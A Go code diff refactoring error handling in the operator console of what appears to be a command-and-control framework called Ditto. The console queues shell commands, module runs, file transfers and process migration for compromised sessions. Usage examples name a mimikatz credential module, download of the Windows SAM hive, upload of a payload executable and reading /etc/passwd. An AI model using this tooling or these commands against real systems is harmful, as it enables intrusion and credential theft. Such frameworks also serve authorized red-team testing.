@@ -164,8 +164,9 @@ func (is *InteractiveServer) handleCommand(cmd string, args []string) error {
 		banner.PrintDittoBanner()
 	case "exit", "quit", "q":
 		if is.isServerRunning() {
-			fmt.Println("[!] Server is running. Stop it first with 'stop-server'")
-			return nil
+			return fmt.Errorf("server is running - stop it first with 'stop-server' or 'server stop'\n"+
+				"  Usage: server stop\n"+
+				"  Note: You cannot exit while the server is running")
 		}
 		fmt.Println("Exiting Ditto...")
 		os.Exit(0)
@@ -284,8 +285,9 @@ func (is *InteractiveServer) handleServer(args []string) error {
 // startServer starts the C2 server with the given address
 func (is *InteractiveServer) startServer(listenAddr string) error {
 	if is.isServerRunning() {
-		fmt.Println("[!] Server is already running")
-		return nil
+		return fmt.Errorf("server is already running\n"+
+			"  Use 'server stop' to stop the current server\n"+
+			"  Use 'server status' to check server status")
 	}
 
 	// Validate address format
@@ -361,8 +363,9 @@ func (is *InteractiveServer) handleServerStatus() error {
 
 func (is *InteractiveServer) handleStopServer() error {
 	if !is.isServerRunning() {
-		fmt.Println("[!] Server is not running")
-		return nil
+		return fmt.Errorf("server is not running\n"+
+			"  Use 'server start' or 'server <address>' to start the server\n"+
+			"  Use 'server status' to check server status")
 	}
 
 	fmt.Println("[*] Stopping server...")
@@ -1158,121 +1161,138 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 				fmt.Println("[!] Error: Command cannot be empty")
 				fmt.Println("    Usage: shell <command>")
 				fmt.Println("    Example: shell whoami")
-			} else {
-				is.executeShellCommand(sessionID, strings.Join(args, " "))
+				continue
+			}
+			if err := is.executeShellCommand(sessionID, strings.Join(args, " ")); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
 			}
 		case "module", "run":
-			if len(args) >= 1 {
-				is.executeModule(sessionID, args[0], args[1:])
-			} else {
+			if len(args) < 1 {
 				fmt.Println("[!] Error: Module ID is required")
 				fmt.Println("    Usage: module <module_id> [args...]")
 				fmt.Println("    Example: module powershell/credentials/mimikatz")
 				fmt.Println("    Use 'modules' command to list available modules")
+				continue
+			}
+			if err := is.executeModule(sessionID, args[0], args[1:]); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
 			}
 		case "download":
-			if len(args) >= 1 {
-				is.downloadFile(sessionID, args[0])
-			} else {
+			if len(args) < 1 {
 				fmt.Println("[!] Error: Remote path is required")
 				fmt.Println("    Usage: download <remote_path>")
 				fmt.Println("    Example: download C:\\Windows\\System32\\config\\sam")
+				continue
+			}
+			if err := is.downloadFile(sessionID, args[0]); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
 			}
 		case "upload":
-			if len(args) >= 2 {
-				is.uploadFile(sessionID, args[0], args[1])
-			} else {
+			if len(args) < 2 {
 				fmt.Println("[!] Error: Both local and remote paths are required")
 				fmt.Println("    Usage: upload <local_path> <remote_path>")
 				fmt.Println("    Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
+				continue
+			}
+			if err := is.uploadFile(sessionID, args[0], args[1]); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
 			}
 		case "migrate":
-			if len(args) >= 1 {
-				if pid, err := strconv.Atoi(args[0]); err == nil {
-					if pid <= 0 {
-						fmt.Printf("[!] Error: Invalid process ID: %d\n", pid)
-						fmt.Println("    Process ID must be a positive number")
-						fmt.Println("    Example: migrate 1234")
-					} else {
-						is.migrateProcess(sessionID, pid)
-					}
-				} else {
-					fmt.Printf("[!] Error: Invalid process ID '%s': must be a number\n", args[0])
-					fmt.Println("    Usage: migrate <pid>")
-					fmt.Println("    Example: migrate 1234")
-				}
-			} else {
+			if len(args) < 1 {
 				fmt.Println("[!] Error: Process ID is required")
 				fmt.Println("    Usage: migrate <pid>")
 				fmt.Println("    Example: migrate 1234")
+				continue
+			}
+			pid, err := strconv.Atoi(args[0])
+			if err != nil {
+				fmt.Printf("[!] Error: Invalid process ID '%s': must be a number\n", args[0])
+				fmt.Println("    Usage: migrate <pid>")
+				fmt.Println("    Example: migrate 1234")
+				continue
+			}
+			if pid <= 0 {
+				fmt.Printf("[!] Error: Invalid process ID: %d (must be positive)\n", pid)
+				fmt.Println("    Usage: migrate <pid>")
+				fmt.Println("    Example: migrate 1234")
+				continue
+			}
+			if err := is.migrateProcess(sessionID, pid); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
 			}
 		case "cat":
-			if len(args) >= 1 {
-				is.executeFilesystemOp(sessionID, "cat", args[0])
-			} else {
+			if len(args) < 1 {
 				fmt.Println("[!] Error: File path is required")
 				fmt.Println("    Usage: cat <path>")
 				fmt.Println("    Example: cat /etc/passwd")
+				continue
+			}
+			if err := is.executeFilesystemOp(sessionID, "cat", args[0]); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
 			}
 		case "head":
-			if len(args) >= 1 {
-				lines := 10
-				if len(args) >= 2 {
-					if n, err := strconv.Atoi(args[1]); err == nil {
-						if n <= 0 {
-							fmt.Printf("[!] Error: Line count must be positive, got %d\n", n)
-							fmt.Println("    Usage: head <path> [lines]")
-							fmt.Println("    Example: head /etc/passwd 20")
-						} else {
-							lines = n
-							is.executeFilesystemOp(sessionID, "head", args[0], fmt.Sprintf("%d", lines))
-						}
-					} else {
-						fmt.Printf("[!] Error: Invalid line count '%s': must be a number\n", args[1])
-						fmt.Println("    Usage: head <path> [lines]")
-						fmt.Println("    Example: head /etc/passwd 20")
-					}
-				} else {
-					is.executeFilesystemOp(sessionID, "head", args[0], fmt.Sprintf("%d", lines))
-				}
-			} else {
+			if len(args) < 1 {
 				fmt.Println("[!] Error: File path is required")
 				fmt.Println("    Usage: head <path> [lines]")
 				fmt.Println("    Example: head /etc/passwd 20")
+				continue
+			}
+			lines := 10
+			if len(args) >= 2 {
+				n, err := strconv.Atoi(args[1])
+				if err != nil {
+					fmt.Printf("[!] Error: Invalid line count '%s': must be a number\n", args[1])
+					fmt.Println("    Usage: head <path> [lines]")
+					fmt.Println("    Example: head /etc/passwd 20")
+					continue
+				}
+				if n <= 0 {
+					fmt.Printf("[!] Error: Line count must be positive, got %d\n", n)
+					fmt.Println("    Usage: head <path> [lines]")
+					fmt.Println("    Example: head /etc/passwd 20")
+					continue
+				}
+				lines = n
+			}
+			if err := is.executeFilesystemOp(sessionID, "head", args[0], fmt.Sprintf("%d", lines)); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
 			}
 		case "tail":
-			if len(args) >= 1 {
-				lines := 10
-				if len(args) >= 2 {
-					if n, err := strconv.Atoi(args[1]); err == nil {
-						if n <= 0 {
-							fmt.Printf("[!] Error: Line count must be positive, got %d\n", n)
-							fmt.Println("    Usage: tail <path> [lines]")
-							fmt.Println("    Example: tail /var/log/syslog 50")
-						} else {
-							lines = n
-							is.executeFilesystemOp(sessionID, "tail", args[0], fmt.Sprintf("%d", lines))
-						}
-					} else {
-						fmt.Printf("[!] Error: Invalid line count '%s': must be a number\n", args[1])
-						fmt.Println("    Usage: tail <path> [lines]")
-						fmt.Println("    Example: tail /var/log/syslog 50")
-					}
-				} else {
-					is.executeFilesystemOp(sessionID, "tail", args[0], fmt.Sprintf("%d", lines))
-				}
-			} else {
+			if len(args) < 1 {
 				fmt.Println("[!] Error: File path is required")
 				fmt.Println("    Usage: tail <path> [lines]")
 				fmt.Println("    Example: tail /var/log/syslog 50")
+				continue
+			}
+			lines := 10
+			if len(args) >= 2 {
+				n, err := strconv.Atoi(args[1])
+				if err != nil {
+					fmt.Printf("[!] Error: Invalid line count '%s': must be a number\n", args[1])
+					fmt.Println("    Usage: tail <path> [lines]")
+					fmt.Println("    Example: tail /var/log/syslog 50")
+					continue
+				}
+				if n <= 0 {
+					fmt.Printf("[!] Error: Line count must be positive, got %d\n", n)
+					fmt.Println("    Usage: tail <path> [lines]")
+					fmt.Println("    Example: tail /var/log/syslog 50")
+					continue
+				}
+				lines = n
+			}
+			if err := is.executeFilesystemOp(sessionID, "tail", args[0], fmt.Sprintf("%d", lines)); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
 			}
 		case "grep":
-			if len(args) >= 2 {
-				is.executeFilesystemOp(sessionID, "grep", args[1], args[0])
-			} else {
+			if len(args) < 2 {
 				fmt.Println("[!] Error: Both pattern and path are required")
 				fmt.Println("    Usage: grep <pattern> <path>")
 				fmt.Println("    Example: grep 'ERROR' /var/log/app.log")
+				continue
+			}
+			if err := is.executeFilesystemOp(sessionID, "grep", args[1], args[0]); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
 			}
 		case "help", "h":
 			fmt.Println("Session commands:")
@@ -1288,24 +1308,25 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 			fmt.Println("  back, exit       - Exit session")
 		default:
 			// Default to shell command
-			is.executeShellCommand(sessionID, line)
+			if err := is.executeShellCommand(sessionID, line); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
+			}
 		}
 	}
 	
 	return nil
 }
 
-func (is *InteractiveServer) executeShellCommand(sessionID, command string) {
+func (is *InteractiveServer) executeShellCommand(sessionID, command string) error {
 	if is.server == nil {
-		fmt.Println("[!] Error: Server not initialized")
-		return
+		return fmt.Errorf("server not initialized\n"+
+			"  Ensure the C2 server is running with 'server start'")
 	}
 	
 	if command == "" {
-		fmt.Println("[!] Error: Command cannot be empty")
-		fmt.Println("    Usage: shell <command>")
-		fmt.Println("    Example: shell whoami")
-		return
+		return fmt.Errorf("command cannot be empty\n"+
+			"  Usage: shell <command>\n"+
+			"  Example: shell whoami")
 	}
 	
 	// Queue task for session
@@ -1319,27 +1340,27 @@ func (is *InteractiveServer) executeShellCommand(sessionID, command string) {
 	}
 	is.server.EnqueueTask(task)
 	fmt.Printf("[+] Queued command: %s\n", command)
+	return nil
 }
 
-func (is *InteractiveServer) executeModule(sessionID, moduleID string, args []string) {
+func (is *InteractiveServer) executeModule(sessionID, moduleID string, args []string) error {
 	if is.server == nil {
-		fmt.Println("[!] Error: Server not initialized")
-		return
+		return fmt.Errorf("server not initialized\n"+
+			"  Ensure the C2 server is running with 'server start'")
 	}
 	
 	if moduleID == "" {
-		fmt.Println("[!] Error: Module ID cannot be empty")
-		fmt.Println("    Usage: module <module_id> [args...]")
-		fmt.Println("    Example: module powershell/credentials/mimikatz")
-		return
+		return fmt.Errorf("module ID cannot be empty\n"+
+			"  Usage: module <module_id> [args...]\n"+
+			"  Example: module powershell/credentials/mimikatz\n"+
+			"  Use 'modules' command to list available modules")
 	}
 	
 	module, ok := is.moduleRegistry.GetModule(moduleID)
 	if !ok {
-		fmt.Printf("[!] Error: Module not found: %s\n", moduleID)
-		fmt.Println("    Use 'modules' command to list available modules")
-		fmt.Println("    Note: Module IDs are case-sensitive")
-		return
+		return fmt.Errorf("module not found: %s\n"+
+			"  Use 'modules' command to list available modules\n"+
+			"  Note: Module IDs are case-sensitive", moduleID)
 	}
 	
 	// Validate module exists (we already checked above)
@@ -1364,19 +1385,19 @@ func (is *InteractiveServer) executeModule(sessionID, moduleID string, args []st
 	}
 	is.server.EnqueueTask(task)
 	fmt.Printf("[+] Queued module: %s (session: %s)\n", moduleID, shortID(sessionID))
+	return nil
 }
 
-func (is *InteractiveServer) downloadFile(sessionID, remotePath string) {
+func (is *InteractiveServer) downloadFile(sessionID, remotePath string) error {
 	if is.server == nil {
-		fmt.Println("[!] Error: Server not initialized")
-		return
+		return fmt.Errorf("server not initialized\n"+
+			"  Ensure the C2 server is running with 'server start'")
 	}
 	
 	if remotePath == "" {
-		fmt.Println("[!] Error: Remote path cannot be empty")
-		fmt.Println("    Usage: download <remote_path>")
-		fmt.Println("    Example: download C:\\Windows\\System32\\config\\sam")
-		return
+		return fmt.Errorf("remote path cannot be empty\n"+
+			"  Usage: download <remote_path>\n"+
+			"  Example: download C:\\Windows\\System32\\config\\sam")
 	}
 	
 	task := &tasks.Task{
@@ -1389,41 +1410,39 @@ func (is *InteractiveServer) downloadFile(sessionID, remotePath string) {
 	}
 	is.server.EnqueueTask(task)
 	fmt.Printf("[+] Queued download: %s\n", remotePath)
+	return nil
 }
 
-func (is *InteractiveServer) uploadFile(sessionID, localPath, remotePath string) {
+func (is *InteractiveServer) uploadFile(sessionID, localPath, remotePath string) error {
 	if is.server == nil {
-		fmt.Println("[!] Error: Server not initialized")
-		return
+		return fmt.Errorf("server not initialized\n"+
+			"  Ensure the C2 server is running with 'server start'")
 	}
 	
 	if localPath == "" {
-		fmt.Println("[!] Error: Local path cannot be empty")
-		fmt.Println("    Usage: upload <local_path> <remote_path>")
-		fmt.Println("    Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
-		return
+		return fmt.Errorf("local path cannot be empty\n"+
+			"  Usage: upload <local_path> <remote_path>\n"+
+			"  Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
 	}
 	
 	if remotePath == "" {
-		fmt.Println("[!] Error: Remote path cannot be empty")
-		fmt.Println("    Usage: upload <local_path> <remote_path>")
-		fmt.Println("    Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
-		return
+		return fmt.Errorf("remote path cannot be empty\n"+
+			"  Usage: upload <local_path> <remote_path>\n"+
+			"  Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
 	}
 	
 	// Check if local file exists
 	if _, err := os.Stat(localPath); os.IsNotExist(err) {
-		fmt.Printf("[!] Error: Local file not found: %s\n", localPath)
-		fmt.Println("    Usage: upload <local_path> <remote_path>")
-		fmt.Println("    Note: Provide the full path to the file you want to upload")
-		return
+		return fmt.Errorf("local file not found: %s\n"+
+			"  Usage: upload <local_path> <remote_path>\n"+
+			"  Note: Provide the full path to the file you want to upload\n"+
+			"  Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe", localPath)
 	}
 	
 	data, err := os.ReadFile(localPath)
 	if err != nil {
-		fmt.Printf("[!] Error: Failed to read file: %v\n", err)
-		fmt.Println("    Check file permissions and ensure the file is readable")
-		return
+		return fmt.Errorf("failed to read file '%s': %w\n"+
+			"  Check file permissions and ensure the file is readable", localPath, err)
 	}
 	
 	task := &tasks.Task{
@@ -1437,20 +1456,19 @@ func (is *InteractiveServer) uploadFile(sessionID, localPath, remotePath string)
 	}
 	is.server.EnqueueTask(task)
 	fmt.Printf("[+] Queued upload: %s -> %s (%d bytes)\n", localPath, remotePath, len(data))
+	return nil
 }
 
-func (is *InteractiveServer) migrateProcess(sessionID string, pid int) {
+func (is *InteractiveServer) migrateProcess(sessionID string, pid int) error {
 	if is.server == nil {
-		fmt.Println("[!] Error: Server not initialized")
-		return
+		return fmt.Errorf("server not initialized\n"+
+			"  Ensure the C2 server is running with 'server start'")
 	}
 	
 	if pid <= 0 {
-		fmt.Printf("[!] Error: Invalid process ID: %d\n", pid)
-		fmt.Println("    Usage: migrate <pid>")
-		fmt.Println("    Process ID must be a positive number")
-		fmt.Println("    Example: migrate 1234")
-		return
+		return fmt.Errorf("invalid process ID: %d (must be positive)\n"+
+			"  Usage: migrate <pid>\n"+
+			"  Example: migrate 1234", pid)
 	}
 	
 	task := &tasks.Task{
@@ -1464,26 +1482,28 @@ func (is *InteractiveServer) migrateProcess(sessionID string, pid int) {
 	}
 	is.server.EnqueueTask(task)
 	fmt.Printf("[+] Queued process migration to PID %d\n", pid)
+	return nil
 }
 
-func (is *InteractiveServer) executeFilesystemOp(sessionID, op string, path string, args ...string) {
+func (is *InteractiveServer) executeFilesystemOp(sessionID, op string, path string, args ...string) error {
 	if is.server == nil {
-		fmt.Println("[!] Error: Server not initialized")
-		return
+		return fmt.Errorf("server not initialized\n"+
+			"  Ensure the C2 server is running with 'server start'")
 	}
 	
 	if path == "" {
-		fmt.Printf("[!] Error: Path cannot be empty for %s operation\n", op)
-		fmt.Printf("    Usage: %s <path>\n", op)
-		switch op {
-		case "head", "tail":
-			fmt.Printf("    Example: %s /etc/passwd [lines]\n", op)
-		case "grep":
-			fmt.Println("    Example: grep <pattern> <path>")
-		default:
-			fmt.Printf("    Example: %s /etc/passwd\n", op)
+		usage := fmt.Sprintf("%s <path>", op)
+		example := fmt.Sprintf("%s /etc/passwd", op)
+		if op == "head" || op == "tail" {
+			usage = fmt.Sprintf("%s <path> [lines]", op)
+			example = fmt.Sprintf("%s /etc/passwd 20", op)
+		} else if op == "grep" {
+			usage = "grep <pattern> <path>"
+			example = "grep 'ERROR' /var/log/app.log"
 		}
-		return
+		return fmt.Errorf("path cannot be empty for %s operation\n"+
+			"  Usage: %s\n"+
+			"  Example: %s", op, usage, example)
 	}
 	
 	task := &tasks.Task{
@@ -1498,6 +1518,7 @@ func (is *InteractiveServer) executeFilesystemOp(sessionID, op string, path stri
 	}
 	is.server.EnqueueTask(task)
 	fmt.Printf("[+] Queued %s operation: %s\n", op, path)
+	return nil
 }
 
 func (is *InteractiveServer) handlePortForward(args []string) error {
